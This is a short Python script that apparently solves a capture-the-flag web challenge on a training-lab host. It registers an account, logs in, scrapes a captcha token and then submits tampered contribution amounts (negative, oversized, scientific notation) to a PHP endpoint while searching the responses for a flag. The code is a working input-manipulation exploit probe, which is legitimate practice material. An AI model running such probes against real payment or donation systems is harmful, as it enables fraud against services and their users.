import sys, requests, urllib3, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
urllib3.disable_warnings()
BASE = "http://chatelaine.cylabacademy.net:19299/"
s = requests.Session()
s.post(BASE + "register.php", data={"user": "richguy1", "pass": "pass1"}, timeout=15)
r = s.post(BASE + "index.php", data={"username": "richguy1", "password": "pass1"}, timeout=15)
cap = re.search(r'name="captcha" value="([^"]+)"', r.text)
print("captcha:", cap.group(1) if cap else None)
for amount in ("100", "-1", "1000000", "99999999999999999999", "1e9"):
    try:
        r2 = s.post(BASE + "contribute.php", data={"captcha": cap.group(1) if cap else "0",
                                                   "moneys": amount}, timeout=15)
        m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", r2.text)
        txt = re.sub(r"<[^>]+>", " ", r2.text)
        txt = re.sub(r"\s+", " ", txt)
        print("montant %-22s -> %d | %s" % (amount, len(r2.text),
              ("FLAG " + m.group(0)) if m else txt[:160]))
        if m:
            break
    except Exception as e:
        print(amount, "ERR", type(e).__name__)
